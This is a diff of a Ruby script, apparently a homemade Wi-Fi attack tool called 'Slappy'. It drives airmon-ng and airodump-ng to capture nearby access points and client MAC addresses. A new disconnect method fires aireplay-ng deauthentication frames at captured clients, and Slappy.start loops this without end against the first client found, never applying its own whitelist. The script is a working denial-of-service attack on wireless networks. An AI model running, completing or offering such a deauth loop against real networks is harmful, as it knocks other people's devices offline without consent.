@@ -1,46 +1,51 @@
 require 'securerandom'
 require 'timeout'
 # require 'byebug'
-class Probe
-  def self.start_mon(ifname = "wlx00c0ca830670")
+class Wifi
+  def initialize(iface, mon_iface)
+    @ifname = iface
+    @mon_iface = mon_iface
+  end
+
+  def start_mon()
     puts "starting mon mode"
-    monmode_results = `airmon-ng start #{ifname}`
+    monmode_results = `airmon-ng start #{@ifname}`
     puts "results: #{monmode_results}"
 
     #check if the network was put into mon
-    if monmode_results.include? "monitor mode enabled on"
-      puts "#{ifname} now in mon mode!"
+    if monmode_results.include? @mon_iface
+      puts "#{@ifname} now in mon mode!"
     else
-      raise "Network interface: unable to stop"
+      raise "Network interface: unable to start"
     end
   end
 
-  def self.stop_mon(ifname = "wlx00c0ca830670")
+  def stop_mon()
     puts "stoping mon mode"
-    monmode_results = `airmon-ng stop #{ifname}mon`
+    monmode_results = `airmon-ng stop #{@mon_iface}`
 
     puts "results: #{monmode_results}"
 
     #check if the network was put into mon
-    if !monmode_results.include? "wlan0mone"
+    if !monmode_results.include? 'xxx'
       puts "SUCCESS"
     else
       raise "Network interface: unable to stop"
     end
   end
 
-  def self.dump
+  def dump(time)
     puts "dumping"
     temp_filename = SecureRandom.hex(10)
     puts "started #{temp_filename}"
 
     status = Timeout::timeout(10) {
-      `timeout 5s airodump-ng mon0  --output-format "csv" -w "./#{temp_filename}" & echo "closing airodump..." & puts "closing scan."`
+      `timeout #{time}s airodump-ng #{@mon_iface}  --output-format "csv" -w "./dumps/#{temp_filename}" & echo "closing airodump..." & echo "closing scan."`
     } rescue Timeout::Error
 puts "Files #{temp_filename}"
     accesspoints = []
     format = []
-    File.foreach("#{temp_filename}-01.csv") { |line|
+    File.foreach("dumps/#{temp_filename}-01.csv") { |line|
       next if line.length < 3
        if line.include? "BSSID, First time seen,"
          format = line.split(',').map{ |key| key.downcase.split(' ').join('_').strip}
@@ -51,8 +56,13 @@ puts "Files #{temp_filename}"
        end
       #  print "--#{line}--"
      }
-     return accesspoints
+     return Dump.new(temp_filename)
 
+  end
+
+  def disconnect(client)
+    puts "\n\nDisconnecting"
+    `aireplay-ng -0 5  --ignore-negative-one -a #{client.bssid} -c #{client.station_mac} #{@mon_iface}`
   end
 
   def self.read_dump
@@ -61,15 +71,7 @@ puts "Files #{temp_filename}"
     end
   end
 end
-# Probe.start_mon
-# points = Probe.dump
-# Probe.stop_mon
-# # Probe.read_dump
-# puts points
-# puts "%%%"
-# points.each do |point|
-#   puts "bssid\t#{point['bssid']}\t#{point['essid']}"
-# end
+
 
 class Dump
   def initialize(filename)
@@ -81,8 +83,7 @@ class Dump
     clients = []
     format = []
     parsing_accesspoints = true # reads accesspoints first
-    File.foreach("#{@filename}-01.csv") { |line|
-      puts line
+    File.foreach("dumps/#{@filename}-01.csv") { |line|
       next if line.length < 3
        if line.include? "BSSID, First time seen,"
          format = line.split(',').map{ |key| key.downcase.split(' ').join('_').strip}
@@ -96,24 +97,82 @@ class Dump
         if parsing_accesspoints
           accesspoints << Hash[format.zip(line.split(','))]
         else
-          clients << Hash[format.zip(line.split(','))]
+          # clients << Hash[format.zip(line.split(','))]
+          params = Hash[format.zip(line.split(','))]
+          puts params
+          clients << Client.new(params['station_mac'], params['bssid'])
+
        end
       #  print "--#{line}--"
      }
      {'accesspoints' => accesspoints, 'clients' => clients}
   end
 
+  def print
+    puts "\n\nDUMP ID #{@filename}"
+    puts "Clients"
+    points = read
+    points['clients'].each do |client|
+      puts "bssid\t#{client.bssid}\tstation mac\t#{client.station_mac}"
+    end
+    puts "\naccesspoints"
+    points['accesspoints'].each do |point|
+      puts "bssid\t#{point['bssid']}\tessid\t#{point['essid']}"
+    end
+  end
+
+end
+
+class Client
+  attr_accessor :station_mac, :bssid
+  def initialize(station_mac, bssid)
+    @station_mac = station_mac
+    @bssid = bssid
+  end
+end
+
+class Accesspoint
+  def initialize(station, essid)
+    @station = station
+    @essid = essid
+  end
 end
 
 class Slappy
-  def whitelist
+  def self.whitelist
     ['00:c0:ca:83:06:70']
   end
 
-  def disconnect(id)
-    `aireplay-ng -0 5  --ignore-negative-one -a 1C:B7:2C:CC:93:70 -c 00:C0:CA:83:06:70 mon0`
+
+  def self.start
+    wifi = Wifi.new('wlx00c0ca830670', 'wlan0mon')
+    wifi.start_mon
+    # points = wifi.dump(5)
+    points = Dump.new "e5c66210f3bff65823af"
+    # wifi.stop_mon
+
+    points.print
+    wifi.disconnect points.read['clients'][0]
+    start
   end
 end
+Slappy.start
+# wifi = Wifi.new('wlx00c0ca830670', 'wlan0mon')
+# wifi.start_mon
+# # points = wifi.dump(5)
+# points = Dump.new "e5c66210f3bff65823af"
+# # wifi.stop_mon
+#
+# points.print
+# wifi.disconnect points.read['clients'][0]
+# Wifi.stop_mon
+# Wifi.start_mon
+# points = Wifi.dump
+# Wifi.stop_mon
+# # Probe.read_dump
+# puts points
+# puts "%%%"
 
-dump = Dump.new('6acd158bc43227b16c5c')
-puts dump.read
+
+# dump = Dump.new('6acd158bc43227b16c5c')
+# puts dump.read
